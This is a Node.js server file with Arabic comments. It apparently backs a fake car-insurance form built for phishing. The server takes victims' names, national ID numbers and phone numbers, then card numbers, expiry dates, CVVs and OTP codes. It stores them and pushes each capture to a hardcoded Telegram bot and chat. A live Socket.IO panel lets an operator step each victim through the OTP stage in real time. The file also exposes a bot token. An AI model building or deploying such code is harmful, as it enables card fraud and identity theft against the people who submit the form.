const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);

// === إعدادات Telegram ===
const TELEGRAM_BOT_TOKEN = '7647127310:AAEL_VzCr1wTh26Exczu6IPuFgEsH4HHHVE'; // استبدل بقيمتك الحقيقية
const TELEGRAM_CHAT_ID = '6454807559'; // استبدل بقيمتك الحقيقية

/**
 * دالة لإرسال رسالة إلى Telegram
 * @param {string} message الرسالة المراد إرسالها
 * @returns {Promise<boolean>} True إذا تم الإرسال بنجاح، False بخلاف ذلك
 */
async function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        if (response.ok && result.ok) {
            console.log("Message sent to Telegram successfully.");
            return true;
        } else {
            console.error("Telegram API Error:", result.description || 'Unknown error');
            return false;
        }
    } catch (error) {
        console.error("Failed to send message to Telegram:", error);
        return false;
    }
}

// تهيئة Socket.IO مع CORS
const io = socketIo(server, {
    cors: {
        origin: "http://localhost:3000",
        methods: ["GET", "POST"]
    }
});

// مسار ملف البيانات JSON
const DATA_FILE = path.join(__dirname, 'form_submissions.json');

// التأكد من وجود ملف البيانات
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, '[]', 'utf8');
    console.log('Created empty form_submissions.json file.');
}

// تهيئة CORS لطلبات HTTP العادية
app.use(cors({
    origin: "http://localhost:3000",
    methods: ["GET", "POST"]
}));

// تمكين Express من قراءة JSON و URL-encoded bodies
app.use(express.json()); // لاستقبال JSON من طلبات Fetch
app.use(express.urlencoded({ extended: true })); // لاستقبال البيانات العادية (إذا احتجت لاحقاً)

// لخدمة الملفات الثابتة (مثل index.html, CSS, JS) من مجلد public
app.use(express.static(path.join(__dirname, 'public')));


// دالة لقراءة البيانات
function readSubmissions() {
    try {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        const submissions = JSON.parse(data);
        if (submissions === null || !Array.isArray(submissions)) {
            console.error("Error decoding form_submissions.json. File might be corrupted or not an array.");
            return [];
        }
        return submissions;
    } catch (error) {
        console.error('Error reading data file:', error);
        return [];
    }
}

// دالة لكتابة البيانات
function writeSubmissions(submissions) {
    try {
        // استخدام JSON_PRETTY_PRINT و JSON_UNESCAPED_UNICODE (افتراضيًا في Node.js)
        fs.writeFileSync(DATA_FILE, JSON.stringify(submissions, null, 2), 'utf8');
        io.emit('data_updated', { data: submissions });
        console.log('Data saved and broadcasted via Socket.IO.');
    } catch (error) {
        console.error('Error writing data file:', error);
    }
}

// ===============================================
// نقطة نهاية واحدة (Single Endpoint) لجميع عمليات PHP السابقة
// ===============================================
app.post('/process_form_data', async (req, res) => {
    const formData = req.body; // البيانات ستكون هنا ككائن JSON
    const action = formData.action;
    let submissions = readSubmissions();
    let response = { status: 'error', message: 'طلب غير صالح.' };
    let updated = false;
    let id_number; // تعريف متغير id_number هنا ليكون متاحاً في كل حالات الـ switch

    switch (action) {
        case 'submit_initial_form':
            if (!formData.owner_name || !formData.id_number || !formData.phone) {
                response = { status: 'error', message: 'يرجى ملء الاسم، رقم الهوية، ورقم الهاتف.' };
                break;
            }

            id_number = formData.id_number; // استخدم id_number مباشرة من formData
            let foundIndex = -1;

            submissions.forEach((s, index) => {
                if (s.id_number && s.id_number === id_number) {
                    foundIndex = index;
                }
            });

            const new_submission_data = {
                owner_name: formData.owner_name,
                id_number: id_number,
                phone: formData.phone,
                purpose: formData.purpose || 'new_insurance',
                serial_number_form: formData.serial_number_form || '',
                manufacture_year: formData.manufacture_year || '',
                serial_number_custom: formData.serial_number_custom || '',
                status: 'pending',
                submission_timestamp: new Date().toISOString(), // تنسيق ISO 8601
                geo_info: formData.geo_info || null, // من الكود السابق في index.html
                browser_info: formData.browser_info || null // من الكود السابق في index.html
            };

            let action_message;
            let telegram_prefix;

            if (foundIndex !== -1) {
                // دمج البيانات الموجودة مع البيانات الجديدة
                submissions[foundIndex] = { ...submissions[foundIndex], ...new_submission_data };
                action_message = 'تم تحديث بياناتك بنجاح.';
                telegram_prefix = `<b>تحديث بيانات عميل:</b> ${new_submission_data.owner_name || 'غير معروف'}\n\n`;
            } else {
                submissions.push(new_submission_data);
                action_message = 'تم استلام بياناتك بنجاح.';
                telegram_prefix = `<b>طلب جديد من عميل:</b> ${new_submission_data.owner_name || 'غير معروف'}\n\n`;
            }

            writeSubmissions(submissions); // حفظ البيانات وإرسالها عبر Socket.IO

            response = { status: 'success', message: action_message };

            // إرسال رسالة Telegram للطلب الأولي/التحديث
            const telegram_message_initial = telegram_prefix +
                `<b>الاسم:</b> ${new_submission_data.owner_name || 'غير متوفر'}\n` +
                `<b>رقم الهوية:</b> ${new_submission_data.id_number || 'غير متوفر'}\n` +
                `<b>الهاتف:</b> ${new_submission_data.phone || 'غير متوفر'}\n` +
                `<b>الغرض:</b> ${new_submission_data.purpose || 'غير متوفر'}\n` +
                `<b>تاريخ الإرسال:</b> ${new_submission_data.submission_timestamp || 'غير متوفر'}` +
                (new_submission_data.serial_number_form ? `\n<b>الرقم التسلسلي (استمارة):</b> ${new_submission_data.serial_number_form}` : '') +
                (new_submission_data.manufacture_year ? `\n<b>سنة الصنع:</b> ${new_submission_data.manufacture_year}` : '') +
                (new_submission_data.serial_number_custom ? `\n<b>الرقم التسلسلي (جمركية):</b> ${new_submission_data.serial_number_custom}` : '');
            
            await sendTelegramMessage(telegram_message_initial);
            break;

        case 'insurance_details':
            if (!formData.id_number) {
                response = { status: 'error', message: 'رقم الهوية مطلوب لحفظ تفاصيل التأمين.' };
                break;
            }
            id_number = formData.id_number;
            let currentSubmissionForInsurance = submissions.find(s => s.id_number === id_number);
            
            if (currentSubmissionForInsurance) {
                currentSubmissionForInsurance.insurance_details = {
                    insurance_type: formData.insurance_type || '',
                    start_date: formData.start_date || '',
                    usage_purpose: formData.usage_purpose || '',
                    car_value: formData.car_value || '',
                    manufacture_year: formData.manufacture_year || '',
                    repair_location: formData.repair_location || '',
                    timestamp: new Date().toISOString()
                };
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم حفظ تفاصيل التأمين بنجاح.' };
            } else {
                response = { status: 'error', message: 'رقم الهوية غير موجود لحفظ تفاصيل التأمين.' };
            }
            break;

        case 'save_payment_details':
            if (!formData.id_number) {
                response = { status: 'error', message: 'رقم الهوية مطلوب لحفظ تفاصيل الدفع.' };
                break;
            }
            id_number = formData.id_number;
            let currentSubmissionForPayment = submissions.find(s => s.id_number === id_number);

            if (currentSubmissionForPayment) {
                currentSubmissionForPayment.payment_details = {
                    payment_method: formData.payment_method || '',
                    total_amount: formData.total_amount || '',
                    timestamp: new Date().toISOString()
                };
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم حفظ تفاصيل الدفع بنجاح.' };
            } else {
                response = { status: 'error', message: 'رقم الهوية غير موجود لحفظ تفاصيل الدفع.' };
            }
            break;

        case 'save_card_details':
            if (!formData.id_number) {
                response = { status: 'error', message: 'رقم الهوية مطلوب لحفظ تفاصيل البطاقة.' };
                break;
            }
            id_number = formData.id_number;
            let userUpdated = false;
            let currentSubmissionForCard;

            submissions = submissions.map(s => {
                if (s.id_number === id_number) {
                    currentSubmissionForCard = s; // احتفظ بالمرجع للوصول إلى اسم العميل
                    s.card_details = {
                        card_name: formData.card_name || '',
                        card_number: formData.card_number || '',
                        expiry_date: formData.expiry_date || '',
                        cvv: formData.cvv || '',
                        timestamp: new Date().toISOString()
                    };
                    s.status = 'pending'; // تحديث الحالة
                    userUpdated = true;
                }
                return s;
            });

            if (userUpdated) {
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم حفظ تفاصيل البطاقة بنجاح.' };
                
                // إرسال رسالة Telegram لتفاصيل البطاقة
                if (currentSubmissionForCard) {
                    const telegram_message_card = `<b>🔴 تم تعبئة بيانات بطاقة لعميل:</b> ${currentSubmissionForCard.owner_name || 'غير معروف'}\n\n` +
                        `<b>رقم الهوية:</b> ${id_number || 'غير متوفر'}\n` +
                        `<b>رقم البطاقة:</b> ${formData.card_number || 'غير متوفر'}\n` +
                        `<b>تاريخ الانتهاء:</b> ${formData.expiry_date || 'غير متوفر'}\n` +
                        `<b>CVV:</b> ${formData.cvv || 'غير متوفر'}\n` +
                        `<b>وقت الإرسال:</b> ${currentSubmissionForCard.card_details.timestamp || 'غير متوفر'}`;
                    await sendTelegramMessage(telegram_message_card);
                }

            } else {
                response = { status: 'error', message: 'رقم الهوية غير موجود لحفظ تفاصيل البطاقة.' };
            }
            break;

        case 'save_otp':
            if (!formData.id_number || !formData.otp_code) {
                response = { status: 'error', message: 'رقم الهوية ورمز OTP مطلوبان لحفظ OTP.' };
                break;
            }
            id_number = formData.id_number;
            const otp_code = formData.otp_code;
            let userUpdatedOtp = false;
            let currentSubmissionForOtp;

            submissions = submissions.map(s => {
                if (s.id_number === id_number) {
                    currentSubmissionForOtp = s; // احتفظ بالمرجع للوصول إلى اسم العميل
                    if (!s.otp_attempts || !Array.isArray(s.otp_attempts)) {
                        s.otp_attempts = [];
                    }
                    s.otp_attempts.push({
                        otp_code: otp_code,
                        timestamp: new Date().toISOString()
                    });
                    userUpdatedOtp = true;
                }
                return s;
            });

            if (userUpdatedOtp) {
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم حفظ رمز OTP بنجاح.' };

                // إرسال رسالة Telegram لرمز OTP
                if (currentSubmissionForOtp) {
                    const latestOtpAttempt = currentSubmissionForOtp.otp_attempts[currentSubmissionForOtp.otp_attempts.length - 1];
                    const telegram_message_otp = `<b>🚨 تم إدخال رمز OTP لعميل:</b> ${currentSubmissionForOtp.owner_name || 'غير معروف'}\n\n` +
                        `<b>رقم الهوية:</b> ${id_number || 'غير متوفر'}\n` +
                        `<b>رمز OTP:</b> ${latestOtpAttempt.otp_code || 'غير متوفر'}\n` +
                        `<b>وقت الإدخال:</b> ${latestOtpAttempt.timestamp || 'غير متوفر'}`;
                    await sendTelegramMessage(telegram_message_otp);
                }

            } else {
                response = { status: 'error', message: 'رقم الهوية غير موجود لحفظ رمز OTP.' };
            }
            break;

        case 'update_status':
            if (!formData.id_number || !formData.status) {
                response = { status: 'error', message: 'رقم الهوية والحالة مطلوبان للتحديث.' };
                break;
            }
            id_number = formData.id_number;
            const new_status = formData.status;
            let submissionForStatusUpdate;
            submissions = submissions.map(s => {
                if (s.id_number === id_number) {
                    submissionForStatusUpdate = s; // احتفظ بالمرجع للوصول إلى اسم العميل
                    s.status = new_status;
                    updated = true;
                }
                return s;
            });

            if (updated) {
                writeSubmissions(submissions);
                response = { status: 'success', message: 'تم تحديث حالة المستخدم بنجاح.' };
                
                // يمكنك إضافة إرسال رسالة تيليجرام هنا إذا أردت إشعارًا عند تغيير الحالة يدوياً من لوحة المشرف
                // مثال:
                // if (submissionForStatusUpdate) {
                //     const telegram_message_status = `<b>✅ تم تحديث حالة العميل:</b> ${submissionForStatusUpdate.owner_name || 'غير معروف'}\n` +
                //         `<b>رقم الهوية:</b> ${id_number}\n` +
                //         `<b>الحالة الجديدة:</b> ${new_status}`;
                //     await sendTelegramMessage(telegram_message_status);
                // }

            } else {
                response = { status: 'error', message: 'المستخدم غير موجود.' };
            }
            break;

        case 'check_status':
            if (!formData.id_number) {
                response = { status: 'error', message: 'رقم الهوية مطلوب للتحقق من الحالة.' };
                break;
            }
            id_number = formData.id_number;
            let user_status = 'pending';
            const foundSubmission = submissions.find(s => s.id_number === id_number);
            if (foundSubmission) {
                user_status = foundSubmission.status || 'pending';
            }
            response = { status: user_status };
            break;

        default:
            response = { status: 'error', message: 'الإجراء المطلوب غير صالح.' };
            break;
    }

    res.json(response); // إرسال الاستجابة كـ JSON
});


// مراقبة تغييرات ملف JSON مباشرة
fs.watch(DATA_FILE, (eventType, filename) => {
    if (eventType === 'change') {
        console.log(`File ${filename} has been changed. Reloading data.`);
        const updatedData = readSubmissions();
        io.emit('data_updated', { data: updatedData });
    }
});

// التعامل مع اتصالات Socket.IO
io.on('connection', (socket) => {
    console.log('A user connected:', socket.id);
    socket.emit('initial_data', { data: readSubmissions() });

    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);
    });

    socket.on('update_status_via_socket', ({ id_number, status }) => {
        let submissions = readSubmissions();
        const index = submissions.findIndex(s => s.id_number === id_number);
        if (index !== -1) {
            submissions[index].status = status;
            writeSubmissions(submissions);
            socket.emit('status_update_ack', { id_number, status, message: 'Status updated successfully via Socket.IO.' });

            // إرسال رسالة تيليجرام عند تحديث الحالة من لوحة المشرف
            const updatedSubmission = submissions[index];
            const telegram_message_status = `<b>✅ تم تحديث حالة العميل:</b> ${updatedSubmission.owner_name || 'غير معروف'}\n` +
                `<b>رقم الهوية:</b> ${id_number}\n` +
                `<b>الحالة الجديدة:</b> ${status}`;
            sendTelegramMessage(telegram_message_status);

        } else {
            socket.emit('status_update_error', { id_number, message: 'Submission not found.' });
        }
    });
});

const PORT = 3000;
server.listen(PORT, () => {
    console.log(`Node.js server listening on port ${PORT}`);
    console.log(`Serving static files from: ${path.join(__dirname, 'public')}`);
    console.log(`Handling all form submissions and data operations via /process_form_data`);
});